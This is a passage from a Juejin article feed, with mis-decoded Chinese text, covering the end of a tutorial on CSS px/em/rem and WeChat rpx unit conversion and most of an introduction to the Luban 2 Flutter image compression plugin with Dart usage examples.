p-<span class="hljs-number">5</span>              â†’ <span class="hljs-attr">padding</span>: <span class="hljs-number">1.</span>25rem â†’ 20px
w-<span class="hljs-number">10</span>             â†’ <span class="hljs-attr">width</span>: <span class="hljs-number">2.</span>5rem â†’ 40px
</code></pre>
<h6 data-id="heading-9">å¦‚æœæ ¹å…ƒç´ å­—ä½“å¤§å°è¢«æ”¹äº†</h6>
<pre><code class="hljs language-js" lang="js">html {
  font-<span class="hljs-attr">size</span>: 20px;  <span class="hljs-comment">/* ä¸æ˜¯é»˜è®¤çš„ 16px */</span>
}
</code></pre>
<p>é‚£ä¹ˆ</p>
<pre><code class="hljs language-js" lang="js">1rem = 20px
<span class="hljs-number">1.</span>25rem = <span class="hljs-number">1.25</span> Ã— <span class="hljs-number">20</span> = 25px  (ä¸æ˜¯ 20px äº†)
</code></pre>
<h3 data-id="heading-10">ä¸‰ç§å•ä½çš„åŒºåˆ«ï¼š</h3>
<ol>
<li>px(åƒç´ )-ç»å¯¹å•ä½</li>
</ol>
<pre><code class="hljs language-js" lang="js">px = å›ºå®šåƒç´ å€¼ï¼Œä¸ä¼šå˜åŒ–
</code></pre>
<ol start="2">
<li>emï¼ˆç›¸å¯¹çˆ¶å…ƒç´ ï¼‰</li>
</ol>
<pre><code class="hljs language-js" lang="js">em Ã— çˆ¶å…ƒç´ å­—ä½“å¤§å° = px
</code></pre>
<ol start="3">
<li>remï¼ˆRoot Emï¼‰- ç›¸å¯¹æ ¹å…ƒç´ </li>
</ol>
<pre><code class="hljs language-js" lang="js">rem = ç›¸å¯¹äºæ ¹å…ƒç´ ï¼ˆ&lt;html&gt;ï¼‰çš„å­—ä½“å¤§å°
</code></pre>
<h2 data-id="heading-11">äºŒã€åœ¨å°ç¨‹åºä¸­æ¢ç®—</h2>
<p>rpxï¼ˆresponsive pixelï¼‰æ˜¯å¾®ä¿¡å°ç¨‹åºçš„å“åº”å¼å•ä½ï¼Œä¸æ˜¯æ ‡å‡†csså•ä½ã€‚</p>
<h6 data-id="heading-12">è§„åˆ™ï¼š</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ = 750rpx
</code></pre>
<h6 data-id="heading-13">æ¢ç®—å…¬å¼ï¼š</h6>
<pre><code class="hljs language-js" lang="js">1rpx = å±å¹•å®½åº¦ Ã· <span class="hljs-number">750</span>
</code></pre>
<p>åè¿‡æ¥</p>
<pre><code class="hljs language-js" lang="js">1px = <span class="hljs-number">750</span> Ã· å±å¹•å®½åº¦ rpx
</code></pre>
<h4 data-id="heading-14">ä¸åŒè®¾å¤‡çš„æ¢ç®—</h4>
<h6 data-id="heading-15">iphone6ï¼ˆåŸºç¡€è®¾å¤‡ï¼‰</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š375px
1rpx = 375px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-16">iPhone6 Plus</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š414px
1rpx = 414px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>552px
1px â‰ˆ <span class="hljs-number">1.</span>81rpx
</code></pre>
<h6 data-id="heading-17">iPhone X</h6>
<pre><code class="hljs language-js" lang="js">å±å¹•å®½åº¦ï¼š375px
1rpx = 375px Ã· <span class="hljs-number">750</span> = <span class="hljs-number">0.</span>5px
1px = 2rpx
</code></pre>
<h6 data-id="heading-18">å¿«é€Ÿæ¢ç®—ï¼ˆä»¥iPhone6ä¸ºåŸºå‡†ï¼‰</h6>
<p>å¸¸ç”¨æ¢ç®—</p>
<pre><code class="hljs language-js" lang="js">1px = 2rpx
10px = 20rpx
20px = 40rpx
50px = 100rpx
100px = 200rpx
</code></pre>
<h3 data-id="heading-19">æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-20">1. rpx åªåœ¨å¾®ä¿¡å°ç¨‹åºä¸­ä½¿ç”¨</h4>
<ul>
<li>
<p>æ ‡å‡† CSS/HTML ä¸æ”¯æŒ rpx</p>
</li>
<li>
<p>UnoCSS ä¸æ”¯æŒ rpx</p>
</li>
<li>
<p>åªåœ¨å¾®ä¿¡å°ç¨‹åºã€uni-appÂ ç­‰æ¡†æ¶ä¸­ä½¿ç”¨</p>
</li>
</ul>
<h4 data-id="heading-21">2. ä¸åŒè®¾å¤‡æ¢ç®—ä¸åŒ</h4>
<ul>
<li>
<p>iPhone6ï¼š1px = 2rpx</p>
</li>
<li>
<p>iPhone6 Plusï¼š1px â‰ˆ 1.81rpx</p>
</li>
<li>
<p>å®‰å“ï¼š1px â‰ˆ 2.08rpx</p>
</li>
<li>
<p>è®¾è®¡ç¨¿å®½åº¦ç”¨Â 750px</p>
</li>
<li>
<p>è®¾è®¡ç¨¿ä¸­çš„ px å€¼ç›´æ¥ä½œä¸º rpx å€¼ä½¿ç”¨</p>
</li>
<li>
<p>ä¾‹å¦‚ï¼šè®¾è®¡ç¨¿ 100px â†’ ä»£ç  100rpx</p>
</li>
</ul>
<h6 data-id="heading-22">å®é™…å¼€å‘ä¸­çš„è¯ï¼Œå°ç¨‹åºä»¥iphone6/7/8ä¸ºåŸºå‡†è®¾å¤‡ã€‚</h6>
<pre><code class="hljs language-js" lang="js">iPhone6/<span class="hljs-number">7</span>/<span class="hljs-number">8</span>
å±å¹•å®½åº¦ï¼š375px
å±å¹•é«˜åº¦ï¼š667px
</code></pre>
<h4 data-id="heading-23">è®¾è®¡ç¨¿æ ‡å‡†</h4>
<pre><code class="hljs language-js" lang="js">è®¾è®¡ç¨¿å®½åº¦ï¼š750pxï¼ˆ<span class="hljs-number">2</span>å€å›¾ï¼‰
è®¾è®¡ç¨¿é«˜åº¦ï¼š1334pxï¼ˆ<span class="hljs-number">2</span>å€å›¾ï¼‰
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7592765004807667763</link>    <guid>https://juejin.cn/post/7592765004807667763</guid>    <pubDate>2026-01-08T08:56:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807667763" data-draft-id="7592816646869925897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½"/> <meta itemprop="keywords" content="Flutter,iOS"/> <meta itemprop="datePublished" content="2026-01-08T08:56:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°ç†Šç åŒ "/> <meta itemprop="url" content="https://juejin.cn/user/1585942854909582"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Luban 2 Flutterï¼šä¸€è¡Œä»£ç åœ¨ Flutter å¼€å‘ä¸­å®ç°å›¾ç‰‡å‹ç¼©åŠŸèƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1585942854909582/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°ç†Šç åŒ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:56:59.000Z" title="Thu Jan 08 2026 08:56:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Luban 2 Flutter â€”â€” é«˜æ•ˆç®€æ´çš„ Flutter å›¾ç‰‡å‹ç¼©æ’ä»¶ï¼Œåƒç´ çº§è¿˜åŸå¾®ä¿¡æœ‹å‹åœˆå‹ç¼©ç­–ç•¥ã€‚</p>
<h2 data-id="heading-0">ğŸ“‘ ç›®å½•</h2>
<ul>
<li><a href="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0" title="#-%E9%A1%B9%E7%9B%AE%E6%8F%8F%E8%BF%B0">ğŸ“– é¡¹ç›®æè¿°</a></li>
<li><a href="#-%E7%89%B9%E6%80%A7" title="#-%E7%89%B9%E6%80%A7">âœ¨ ç‰¹æ€§</a></li>
<li><a href="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94" title="#-%E6%95%88%E6%9E%9C%E4%B8%8E%E5%AF%B9%E6%AF%94">ğŸ“Š æ•ˆæœä¸å¯¹æ¯”</a>
<ul>
<li><a href="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7" title="#-%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95%E7%89%B9%E6%80%A7">ğŸ”¬ æ ¸å¿ƒç®—æ³•ç‰¹æ€§</a></li>
</ul>
</li>
<li><a href="#-%E5%AE%89%E8%A3%85" title="#-%E5%AE%89%E8%A3%85">ğŸ“¦ å®‰è£…</a></li>
<li><a href="#-%E4%BD%BF%E7%94%A8" title="#-%E4%BD%BF%E7%94%A8">ğŸ’» ä½¿ç”¨</a>
<ul>
<li><a href="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87" title="#%E5%8E%8B%E7%BC%A9%E5%8D%95%E5%BC%A0%E5%9B%BE%E7%89%87">å‹ç¼©å•å¼ å›¾ç‰‡</a></li>
<li><a href="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87" title="#%E6%89%B9%E9%87%8F%E5%8E%8B%E7%BC%A9%E5%9B%BE%E7%89%87">æ‰¹é‡å‹ç¼©å›¾ç‰‡</a></li>
</ul>
</li>
<li><a href="#-%E6%8D%90%E5%8A%A9" title="#-%E6%8D%90%E5%8A%A9">â˜• æåŠ©</a></li>
<li><a href="#-license" title="#-license">ğŸ“„ License</a></li>
</ul>
<h2 data-id="heading-1">ğŸ“– é¡¹ç›®æè¿°</h2>
<p>å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fcurzbin%2Fflutter_luban" target="_blank" title="https://gitee.com/curzbin/flutter_luban" ref="nofollow noopener noreferrer">Gitee</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCurzibn%2Fflutter_luban" target="_blank" title="https://github.com/Curzibn/flutter_luban" ref="nofollow noopener noreferrer">Github</a></p>
<p>ç›®å‰åš <code>App</code> å¼€å‘æ€»ç»•ä¸å¼€å›¾ç‰‡è¿™ä¸ªå…ƒç´ ã€‚ä½†æ˜¯éšç€æ‰‹æœºæ‹ç…§åˆ†è¾¨ç‡çš„æå‡ï¼Œå›¾ç‰‡çš„å‹ç¼©æˆä¸ºä¸€ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ã€‚å•çº¯å¯¹å›¾ç‰‡è¿›è¡Œè£åˆ‡ï¼Œå‹ç¼©å·²ç»æœ‰å¾ˆå¤šæ–‡ç« ä»‹ç»ã€‚ä½†æ˜¯è£åˆ‡æˆå¤šå°‘ï¼Œå‹ç¼©æˆå¤šå°‘å´å¾ˆéš¾æ§åˆ¶å¥½ï¼Œè£åˆ‡è¿‡å¤´å›¾ç‰‡å¤ªå°ï¼Œè´¨é‡å‹ç¼©è¿‡å¤´åˆ™æ˜¾ç¤ºæ•ˆæœå¤ªå·®ã€‚</p>
<p>äºæ˜¯è‡ªç„¶æƒ³åˆ° <code>App</code> å·¨å¤´"å¾®ä¿¡"ä¼šæ˜¯æ€ä¹ˆå¤„ç†ï¼Œ<code>Luban</code>ï¼ˆé²ç­ï¼‰å°±æ˜¯é€šè¿‡åœ¨å¾®ä¿¡æœ‹å‹åœˆå‘é€è¿‘100å¼ ä¸åŒåˆ†è¾¨ç‡å›¾ç‰‡ï¼Œå¯¹æ¯”åŸå›¾ä¸å¾®ä¿¡å‹ç¼©åçš„å›¾ç‰‡é€†å‘æ¨ç®—å‡ºæ¥çš„å‹ç¼©ç®—æ³•ã€‚</p>
<p>å› ä¸ºæ˜¯é€†å‘æ¨ç®—ï¼Œæ•ˆæœè¿˜æ²¡æ³•è·Ÿå¾®ä¿¡ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯å·²ç»å¾ˆæ¥è¿‘å¾®ä¿¡æœ‹å‹åœˆå‹ç¼©åçš„æ•ˆæœï¼Œå…·ä½“çœ‹ä»¥ä¸‹å¯¹æ¯”ï¼</p>
<p>æœ¬åº“æ˜¯ <code>Luban</code> çš„ <strong>Flutter ç‰ˆæœ¬</strong>ï¼Œä½¿ç”¨ <strong>TurboJPEG</strong> è¿›è¡Œé«˜æ€§èƒ½å›¾ç‰‡å‹ç¼©ï¼Œæä¾›ç®€æ´æ˜“ç”¨çš„ API å’Œæ¥è¿‘å¾®ä¿¡æœ‹å‹åœˆçš„å‹ç¼©æ•ˆæœã€‚</p>
<h2 data-id="heading-2">ğŸ“Š æ•ˆæœä¸å¯¹æ¯”</h2>















































<table><thead><tr><th align="left">å›¾ç‰‡ç±»å‹</th><th align="left">åŸå›¾ï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th><th align="left">Lubanï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th><th align="left">Wechatï¼ˆåˆ†è¾¨ç‡, å¤§å°ï¼‰</th></tr></thead><tbody><tr><td align="left"><strong>æ ‡å‡†æ‹ç…§</strong></td><td align="left">3024Ã—4032, 5.10MB</td><td align="left">1440Ã—1920, 305KB</td><td align="left">1440Ã—1920, 303KB</td></tr><tr><td align="left"><strong>é«˜æ¸…å¤§å›¾</strong></td><td align="left">4000Ã—6000, 12.10MB</td><td align="left">1440Ã—2160, 318KB</td><td align="left">1440Ã—2160, 305KB</td></tr><tr><td align="left"><strong>2K æˆªå›¾</strong></td><td align="left">1440Ã—3200, 2.10MB</td><td align="left">1440Ã—3200, 148KB</td><td align="left">1440Ã—3200, 256KB</td></tr><tr><td align="left"><strong>è¶…é•¿è®°å½•</strong></td><td align="left">1242Ã—22080, 6.10MB</td><td align="left">758Ã—13490, 290KB</td><td align="left">744Ã—13129, 256KB</td></tr><tr><td align="left"><strong>å…¨æ™¯æ¨ªå›¾</strong></td><td align="left">12000Ã—5000, 8.10MB</td><td align="left">1440Ã—600, 126KB</td><td align="left">1440Ã—600, 123KB</td></tr><tr><td align="left"><strong>è®¾è®¡åŸç¨¿</strong></td><td align="left">6000Ã—6000, 6.90MB</td><td align="left">1440Ã—1440, 263KB</td><td align="left">1440Ã—1440, 279KB</td></tr></tbody></table>
<h2 data-id="heading-3">ğŸ”¬ æ ¸å¿ƒç®—æ³•ç‰¹æ€§</h2>
<p>æœ¬åº“é‡‡ç”¨<strong>è‡ªé€‚åº”ç»Ÿä¸€å›¾åƒå‹ç¼©ç®—æ³• (Adaptive Unified Image Compression)</strong>ï¼Œé€šè¿‡åŸå›¾çš„åˆ†è¾¨ç‡ç‰¹å¾ï¼ŒåŠ¨æ€åº”ç”¨å·®å¼‚åŒ–ç­–ç•¥ï¼Œå®ç°ç”»è´¨ä¸ä½“ç§¯çš„æœ€ä¼˜å¹³è¡¡ã€‚</p>
<h3 data-id="heading-4">æ™ºèƒ½åˆ†è¾¨ç‡å†³ç­–</h3>
<ul>
<li><strong>é«˜æ¸…åŸºå‡† (1440p)</strong>ï¼šé»˜è®¤ä»¥ 1440px ä½œä¸ºçŸ­è¾¹åŸºå‡†ï¼Œç¡®ä¿åœ¨ç°ä»£ 2K/4K å±å¹•ä¸Šçš„è§†è§‰æ¸…æ™°åº¦</li>
<li><strong>å…¨æ™¯å¢™ç­–ç•¥</strong>ï¼šè‡ªåŠ¨è¯†åˆ«è¶…å¤§å…¨æ™¯å›¾ï¼ˆé•¿è¾¹ &gt;10800pxï¼‰ï¼Œé”å®šé•¿è¾¹ä¸º 1440pxï¼Œä¿ç•™å®Œæ•´è§†é‡</li>
<li><strong>è¶…å¤§åƒç´ é™·é˜±</strong>ï¼šå¯¹è¶…è¿‡ 4096ä¸‡åƒç´ çš„è¶…é«˜åƒç´ å›¾è‡ªåŠ¨æ‰§è¡Œ 1/4 é™é‡‡æ ·å¤„ç†</li>
<li><strong>é•¿å›¾å†…å­˜ä¿æŠ¤</strong>ï¼šé’ˆå¯¹è¶…é•¿æˆªå›¾å»ºç«‹ 10.24MP åƒç´ ä¸Šé™ï¼Œé€šè¿‡ç­‰æ¯”ç¼©æ”¾é˜²æ­¢ OOM</li>
</ul>
<h3 data-id="heading-5">è‡ªé€‚åº”æ¯”ç‰¹ç‡æ§åˆ¶</h3>
<ul>
<li><strong>æå°å›¾ (&lt;0.5MP)</strong>ï¼šå‡ ä¹ä¸è¿›è¡Œæœ‰æŸå‹ç¼©ï¼Œé˜²æ­¢å‹ç¼©ä¼ªå½±</li>
<li><strong>é«˜é¢‘ä¿¡æ¯å›¾ (0.5-1MP)</strong>ï¼šæé«˜ç¼–ç è´¨é‡ï¼Œè¡¥å¿åˆ†è¾¨ç‡æŸå¤±</li>
<li><strong>æ ‡å‡†å›¾ç‰‡ (1-3MP)</strong>ï¼šåº”ç”¨å¹³è¡¡ç³»æ•°ï¼Œå¯¹æ ‡ä¸»æµç¤¾äº¤è½¯ä»¶ä½“éªŒ</li>
<li><strong>è¶…å¤§å›¾/é•¿å›¾ (&gt;3MP)</strong>ï¼šåº”ç”¨é«˜å‹ç¼©ç‡ï¼Œæ˜¾è‘—å‡å°‘ä½“ç§¯</li>
</ul>
<h3 data-id="heading-6">å¥å£®æ€§ä¿éšœ</h3>
<ul>
<li><strong>è†¨èƒ€å›é€€</strong>ï¼šå‹ç¼©åä½“ç§¯å¤§äºåŸå›¾æ—¶ï¼Œè‡ªåŠ¨é€ä¼ åŸå›¾ï¼Œç¡®ä¿ç»ä¸"è´Ÿä¼˜åŒ–"</li>
<li><strong>è¾“å…¥é˜²å¾¡</strong>ï¼šå¦¥å–„å¤„ç†æç«¯åˆ†è¾¨ç‡è¾“å…¥ï¼ˆ0ã€è´Ÿæ•°ã€1px ç­‰ï¼‰ï¼Œé˜²æ­¢å´©æºƒ</li>
</ul>
<h2 data-id="heading-7">ğŸ“¦ å®‰è£…</h2>
<p>åœ¨ <code>pubspec.yaml</code> æ–‡ä»¶ä¸­æ·»åŠ ä¾èµ–ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">luban:</span> <span class="hljs-string">^2.0.1</span>
</code></pre>
<p>ç„¶åè¿è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<h2 data-id="heading-8">ğŸ’» ä½¿ç”¨</h2>
<h3 data-id="heading-9">å‹ç¼©å•å¼ å›¾ç‰‡</h3>
<h4 data-id="heading-10">ä½¿ç”¨ File å¯¹è±¡</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> file = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(file);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆ'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'åŸå›¾å¤§å°: <span class="hljs-subst">${compressionResult.originalSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©åå¤§å°: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©ç‡: <span class="hljs-subst">${(compressionResult.compressionRatio * <span class="hljs-number">100</span>).toStringAsFixed(<span class="hljs-number">1</span>)}</span>%'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-11">ä½¿ç”¨å­—ç¬¦ä¸²è·¯å¾„</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressPath(<span class="hljs-string">'/path/to/image.jpg'</span>);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å¤±è´¥: <span class="hljs-subst">$error</span>'</span>),
    (compressionResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œå¤§å°: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¾“å‡ºæ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    },
  );
}
</code></pre>
<h4 data-id="heading-12">æŒ‡å®šè¾“å‡ºæ–‡ä»¶</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> outputFile = File(<span class="hljs-string">'/path/to/output/compressed.jpg'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressToFile(inputFile, outputFile);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œæ–‡ä»¶å·²ä¿å­˜åˆ°: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">æŒ‡å®šè¾“å‡ºç›®å½•</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(inputFile, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œæ–‡ä»¶å·²ä¿å­˜åˆ°: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
